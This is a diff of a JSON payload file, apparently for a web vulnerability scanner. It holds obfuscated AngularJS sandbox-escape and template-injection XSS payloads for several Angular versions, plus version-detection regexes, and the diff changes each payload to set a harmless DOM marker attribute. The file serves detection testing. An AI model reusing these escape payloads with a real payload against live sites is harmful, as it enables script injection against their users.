@@ -2368,7 +2368,7 @@
                   "query",
                   "form"
                 ],
-                "value": "a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,50,48,45,49,50,49,56),String.fromCharCode(42))')()",
+                "value": "a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,48,45,49,50,49,56))')()",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2425,14 +2425,14 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-120-1218",
-              "payload": "a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,50,48,45,49,50,49,56),String.fromCharCode(42))')()",
+              "payload": "a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,48,45,49,50,49,56))')()",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:[0-9]|1[0-8])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:[0-9]|1[0-8])\\b|1\\.2\\.(?:[0-9]|1[0-8])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:[0-9]|1[0-8])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:[0-9]|1[0-8])\\b",
               "versionRange": "expression-1-2-0-to-1-2-18",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "sub-call-get-own-property-descriptor"
+              "payloadFamily": "sub-call-get-own-property-descriptor-dom-marker"
             }
           }
         },
@@ -3539,7 +3539,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{toString().constructor.prototype.charAt=[].join;[{},{}]|orderBy:toString().constructor.fromCharCode(120,61,112,111,115,116,77,101,115,115,97,103,101,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,50,48,44,49,49,53,44,49,49,53,44,53,56,44,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,49,48,44,49,48,51,44,52,53,44,49,49,52,44,52,53,44,52,57,44,53,50,44,52,56,44,52,53,44,52,57,44,53,50,44,53,55,41,44,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,52,50,41,41)}}",
+                "value": "{{toString().constructor.prototype.charAt=[].join;[{},{}]|orderBy:toString().constructor.fromCharCode(120,61,100,111,99,117,109,101,110,116,46,100,111,99,117,109,101,110,116,69,108,101,109,101,110,116,46,115,101,116,65,116,116,114,105,98,117,116,101,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,48,44,57,55,44,49,49,54,44,57,55,44,52,53,44,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,50,48,44,49,49,53,44,49,49,53,41,44,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,49,48,44,49,48,51,44,52,53,44,49,49,52,44,52,53,44,52,57,44,53,50,44,52,56,44,52,53,44,52,57,44,53,50,44,53,55,41,41)}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -3596,14 +3596,14 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-140-149",
-              "payload": "{{toString().constructor.prototype.charAt=[].join;[{},{}]|orderBy:toString().constructor.fromCharCode(120,61,112,111,115,116,77,101,115,115,97,103,101,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,50,48,44,49,49,53,44,49,49,53,44,53,56,44,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,49,48,44,49,48,51,44,52,53,44,49,49,52,44,52,53,44,52,57,44,53,50,44,52,56,44,52,53,44,52,57,44,53,50,44,53,55,41,44,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,52,50,41,41)}}",
+              "payload": "{{toString().constructor.prototype.charAt=[].join;[{},{}]|orderBy:toString().constructor.fromCharCode(120,61,100,111,99,117,109,101,110,116,46,100,111,99,117,109,101,110,116,69,108,101,109,101,110,116,46,115,101,116,65,116,116,114,105,98,117,116,101,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,48,44,57,55,44,49,49,54,44,57,55,44,52,53,44,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,50,48,44,49,49,53,44,49,49,53,41,44,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,49,48,44,49,48,51,44,52,53,44,49,49,52,44,52,53,44,52,57,44,53,50,44,52,56,44,52,53,44,52,57,44,53,50,44,53,55,41,41)}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.4\\.(?:[0-9])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b|1\\.4\\.(?:[0-9])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.4\\.(?:[0-9])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b",
               "versionRange": "reflected-1-4-0-to-1-4-9",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "charat-orderby-fromcharcode"
+              "payloadFamily": "charat-orderby-dom-marker-fromcharcode"
             }
           }
         },
@@ -3736,7 +3736,7 @@
                   "query",
                   "form"
                 ],
-                "value": "&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,104,45,49,52,48,45,49,52,57),String.fromCharCode(42))//');&#125;&#125;",
+                "value": "&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,104,45,49,52,48,45,49,52,57))//');&#125;&#125;",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -3794,14 +3794,14 @@
             },
             "constants": {
               "markerToken": "ptk-ng-rh-140-149",
-              "payload": "&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,104,45,49,52,48,45,49,52,57),String.fromCharCode(42))//');&#125;&#125;",
+              "payload": "&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,104,45,49,52,48,45,49,52,57))//');&#125;&#125;",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.4\\.(?:[0-9])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b|1\\.4\\.(?:[0-9])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.4\\.(?:[0-9])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b",
               "versionRange": "reflected-1-4-0-to-1-4-9",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "entity-orderby-fromcharcode-default"
+              "payloadFamily": "entity-dom-marker-default"
             }
           }
         },
@@ -3835,7 +3835,7 @@
                   "query",
                   "form"
                 ],
-                "value": "&#91;&#91;'a'.constructor.prototype.charAt=&#91;&#93;.join;$eval('x=1} } };postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,97,45,49,52,48,45,49,52,57),String.fromCharCode(42))//');&#93;&#93;",
+                "value": "&#91;&#91;'a'.constructor.prototype.charAt=&#91;&#93;.join;$eval('x=1} } };document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,97,45,49,52,48,45,49,52,57))//');&#93;&#93;",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -3893,14 +3893,14 @@
             },
             "constants": {
               "markerToken": "ptk-ng-ra-140-149",
-              "payload": "&#91;&#91;'a'.constructor.prototype.charAt=&#91;&#93;.join;$eval('x=1} } };postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,97,45,49,52,48,45,49,52,57),String.fromCharCode(42))//');&#93;&#93;",
+              "payload": "&#91;&#91;'a'.constructor.prototype.charAt=&#91;&#93;.join;$eval('x=1} } };document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,97,45,49,52,48,45,49,52,57))//');&#93;&#93;",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.4\\.(?:[0-9])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b|1\\.4\\.(?:[0-9])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.4\\.(?:[0-9])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b",
               "versionRange": "reflected-1-4-0-to-1-4-9",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "entity-orderby-fromcharcode-alt"
+              "payloadFamily": "entity-dom-marker-alt"
             }
           }
         },
@@ -3972,7 +3972,7 @@
                   "query",
                   "form"
                 ],
-                "value": "toString().constructor.prototype.charAt=[].join;[{},{}]|orderBy:toString().constructor.fromCharCode(120,61,112,111,115,116,77,101,115,115,97,103,101,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,50,48,44,49,49,53,44,49,49,53,44,53,56,44,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,49,48,44,49,48,51,44,52,53,44,49,48,49,44,52,53,44,52,57,44,53,50,44,52,56,44,52,53,44,52,57,44,53,50,44,53,51,41,44,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,52,50,41,41)",
+                "value": "toString().constructor.prototype.charAt=[].join;[{},{}]|orderBy:toString().constructor.fromCharCode(120,61,100,111,99,117,109,101,110,116,46,100,111,99,117,109,101,110,116,69,108,101,109,101,110,116,46,115,101,116,65,116,116,114,105,98,117,116,101,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,48,44,57,55,44,49,49,54,44,57,55,44,52,53,44,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,50,48,44,49,49,53,44,49,49,53,41,44,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,49,48,44,49,48,51,44,52,53,44,49,48,49,44,52,53,44,52,57,44,53,50,44,52,56,44,52,53,44,52,57,44,53,50,44,53,51,41,41)",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -4029,14 +4029,14 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-140-145",
-              "payload": "toString().constructor.prototype.charAt=[].join;[{},{}]|orderBy:toString().constructor.fromCharCode(120,61,112,111,115,116,77,101,115,115,97,103,101,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,50,48,44,49,49,53,44,49,49,53,44,53,56,44,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,49,48,44,49,48,51,44,52,53,44,49,48,49,44,52,53,44,52,57,44,53,50,44,52,56,44,52,53,44,52,57,44,53,50,44,53,51,41,44,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,52,50,41,41)",
+              "payload": "toString().constructor.prototype.charAt=[].join;[{},{}]|orderBy:toString().constructor.fromCharCode(120,61,100,111,99,117,109,101,110,116,46,100,111,99,117,109,101,110,116,69,108,101,109,101,110,116,46,115,101,116,65,116,116,114,105,98,117,116,101,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,48,44,57,55,44,49,49,54,44,57,55,44,52,53,44,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,50,48,44,49,49,53,44,49,49,53,41,44,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,49,50,44,49,49,54,44,49,48,55,44,52,53,44,49,49,48,44,49,48,51,44,52,53,44,49,48,49,44,52,53,44,52,57,44,53,50,44,52,56,44,52,53,44,52,57,44,53,50,44,53,51,41,41)",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.4\\.(?:[0-9])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b|1\\.4\\.(?:[0-9])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.4\\.(?:[0-9])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b",
               "versionRange": "reflected-1-4-0-to-1-4-9",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "charat-orderby-fromcharcode"
+              "payloadFamily": "charat-orderby-dom-marker-fromcharcode"
             }
           }
         },
@@ -4441,7 +4441,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{constructor.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,54,45,112,108,117,115),String.fromCharCode(42))')()}}",
+                "value": "{{constructor.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,54,45,112,108,117,115))')()}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -4498,14 +4498,14 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-16-plus",
-              "payload": "{{constructor.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,45,49,54,45,112,108,117,115),String.fromCharCode(42))')()}}",
+              "payload": "{{constructor.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,54,45,112,108,117,115))')()}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.(?:6|7|8)\\.\\d+|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.(?:6|7|8)\\.\\d+|1\\.(?:6|7|8)\\.\\d+[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.(?:6|7|8)\\.\\d+|angular[/_-][^\\n\\r<>]{0,160}1\\.(?:6|7|8)\\.\\d+",
               "versionRange": "expression-1-6-plus",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "constructor-constructor"
+              "payloadFamily": "constructor-constructor-dom-marker"
             }
           }
         },
@@ -4539,7 +4539,7 @@
                   "query",
                   "form"
                 ],
-                "value": "[[constructor.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,97,45,49,54,45,112,108,117,115),String.fromCharCode(42))')()]]",
+                "value": "[[constructor.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,97,45,49,54,45,112,108,117,115))')()]]",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -4605,14 +4605,14 @@
             },
             "constants": {
               "markerToken": "ptk-ng-ra-16-plus",
-              "payload": "[[constructor.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,114,97,45,49,54,45,112,108,117,115),String.fromCharCode(42))')()]]",
+              "payload": "[[constructor.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,97,45,49,54,45,112,108,117,115))')()]]",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.(?:6|7|8)\\.\\d+|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.(?:6|7|8)\\.\\d+|1\\.(?:6|7|8)\\.\\d+[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.(?:6|7|8)\\.\\d+|angular[/_-][^\\n\\r<>]{0,160}1\\.(?:6|7|8)\\.\\d+",
               "versionRange": "expression-1-6-plus",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "constructor-constructor-alt-delimiters"
+              "payloadFamily": "constructor-constructor-alt-delimiters-dom-marker"
             }
           }
         },
@@ -4684,7 +4684,7 @@
                   "query",
                   "form"
                 ],
-                "value": "constructor.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,54,45,112,108,117,115),String.fromCharCode(42))')()",
+                "value": "constructor.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,54,45,112,108,117,115))')()",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -4741,14 +4741,14 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-16-plus",
-              "payload": "constructor.constructor('postMessage(String.fromCharCode(112,116,107,45,120,115,115,58,112,116,107,45,110,103,45,101,45,49,54,45,112,108,117,115),String.fromCharCode(42))')()",
+              "payload": "constructor.constructor('document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,54,45,112,108,117,115))')()",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.(?:6|7|8)\\.\\d+|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.(?:6|7|8)\\.\\d+|1\\.(?:6|7|8)\\.\\d+[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.(?:6|7|8)\\.\\d+|angular[/_-][^\\n\\r<>]{0,160}1\\.(?:6|7|8)\\.\\d+",
               "versionRange": "expression-1-6-plus",
               "context": "expression_context"
             },
             "extensions": {
-              "payloadFamily": "constructor-constructor"
+              "payloadFamily": "constructor-constructor-dom-marker"
             }
           }
         }
